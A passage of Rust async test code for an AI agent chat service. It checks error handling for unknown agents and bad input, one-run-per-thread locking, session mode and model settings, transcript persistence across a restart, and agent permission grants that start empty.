    let unknown_agent: RunAgentInput = serde_json::from_value(
        json!({"threadId": "t", "runId": "r", "messages": [{"role": "user", "content": "x"}], "forwardedProps": {"agentId": "ghost"}}),
    )
    .unwrap();
    assert!(matches!(r.chat.run(unknown_agent).await, Err(ChatError::NotFound(_))));
    let no_agent: RunAgentInput = serde_json::from_value(
        json!({"threadId": "t", "runId": "r", "messages": [{"role": "user", "content": "x"}]}),
    )
    .unwrap();
    assert!(matches!(r.chat.run(no_agent).await, Err(ChatError::NotFound(_))));
    let empty: RunAgentInput = serde_json::from_value(
        json!({"threadId": "t", "runId": "r", "forwardedProps": {"agentId": "claude"}}),
    )
    .unwrap();
    assert!(matches!(r.chat.run(empty).await, Err(ChatError::BadInput(_))));
    assert!(matches!(r.chat.ensure("", "claude").await, Err(ChatError::BadInput(_))));
    assert!(matches!(r.chat.ensure("t", "Not An Id").await, Err(ChatError::BadInput(_))));

    r.agents
        .create(NewAgent {
            id: Some("other".into()),
            name: "Other".into(),
            runtime: AgentRuntime { command: "x".into(), ..AgentRuntime::default() },
            ..NewAgent::default()
        })
        .await
        .unwrap();
    r.chat.ensure("t1", "claude").await.unwrap();
    assert!(matches!(r.chat.ensure("t1", "other").await, Err(ChatError::BadInput(_))));

    // an agent the host cannot launch (no command) and one that fails to start
    r.agents
        .create(NewAgent { id: Some("external".into()), name: "External".into(), ..NewAgent::default() })
        .await
        .unwrap();
    assert!(matches!(r.chat.ensure("t2", "external").await, Err(ChatError::BadInput(_))));
    *r.connector.fail_open.lock() = true;
    let err = r.chat.ensure("t3", "claude").await.unwrap_err();
    assert!(matches!(&err, ChatError::Agent(m) if m.contains("could not start")), "{err:?}");
}

#[tokio::test]
async fn one_run_at_a_time_per_thread() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![Step::UntilCancelled]);
    let rx = r.chat.run(input("t1", "r1", "long")).await.unwrap();
    assert!(matches!(r.chat.run(input("t1", "r2", "second")).await, Err(ChatError::Busy)));
    r.chat.cancel("t1").await.unwrap();
    collect(rx).await;
    r.connector.script(vec![chunk("fine")]);
    collect(r.chat.run(input("t1", "r3", "third")).await.unwrap()).await;
}

#[tokio::test]
async fn settings_change_the_session_and_the_state() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.chat.ensure("t1", "claude").await.unwrap();
    let state = r.chat.settings("t1", SettingsChange::Mode("plan".into())).await.unwrap();
    assert_eq!(state.session.modes.unwrap().current, "plan");
    assert_eq!(r.connector.modes.lock().as_slice(), ["plan"]);
    let state = r
        .chat
        .settings(
            "t1",
            SettingsChange::Config { id: "model".into(), value: ConfigValue::Text("sonnet".into()) },
        )
        .await
        .unwrap();
    let ConfigOption::Select { current, .. } = &state.session.config[0] else { panic!() };
    assert_eq!(current, "sonnet");

    for bad in [
        SettingsChange::Mode("yolo".into()),
        SettingsChange::Config { id: "nope".into(), value: ConfigValue::Bool(true) },
        SettingsChange::Config { id: "model".into(), value: ConfigValue::Text(String::new()) },
    ] {
        assert!(matches!(r.chat.settings("t1", bad).await, Err(ChatError::BadInput(_))));
    }
    assert!(matches!(
        r.chat.settings("ghost", SettingsChange::Mode("plan".into())).await,
        Err(ChatError::NotFound(_))
    ));
    assert_eq!(r.connector.modes.lock().len(), 1, "a refused change never reaches the agent");
}

#[tokio::test]
async fn a_restarted_host_still_shows_the_transcript_and_starts_a_new_session_on_the_next_prompt() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![chunk("before")]);
    collect(r.chat.run(input("t1", "r1", "hello")).await.unwrap()).await;

    // a new service over the same stores = a restart
    let again = ChatService::new(ChatPorts {
        connector: r.connector.clone(),
        threads: r.threads.clone(),
        background: Arc::new(TokioBackground),
        clock: Arc::new(FixedClock(1)),
        random: Arc::new(SeededRandom::default()),
        agents: r.agents.clone(),
        apps: Arc::new(r.fakes.service()),
        mcp_url: None,
    });
    let snap = again.snapshot("t1").await.unwrap();
    assert_eq!(snap.messages.len(), 2);
    assert_eq!(snap.agent_id, "claude");
    assert!(!snap.running);
    r.connector.script(vec![chunk("after")]);
    collect(again.run(input("t1", "r2", "still there?")).await.unwrap()).await;
    assert_eq!(r.connector.opened.lock().len(), 2);
    assert_eq!(again.snapshot("t1").await.unwrap().messages.len(), 4);
    assert!(matches!(again.snapshot("never").await, Err(ChatError::NotFound(_))));
    again.shutdown().await;
    assert_eq!(*r.connector.stopped.lock(), 1);
}

#[tokio::test]
async fn grants_default_to_nothing_for_the_agent_a_chat_runs_as() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.chat.ensure("t1", "claude").await.unwrap();
    let token = r.connector.opened.lock()[0].1.clone().unwrap().token;
    assert!(r.agents.authenticate(&token).unwrap().grants.is_empty());
    r.agents.set_grants(&AgentId("claude".into()), Grants::allow_all()).await.unwrap();
    assert_eq!(r.agents.authenticate(&token).unwrap().grants.len(), 1, "grants are read live");
}
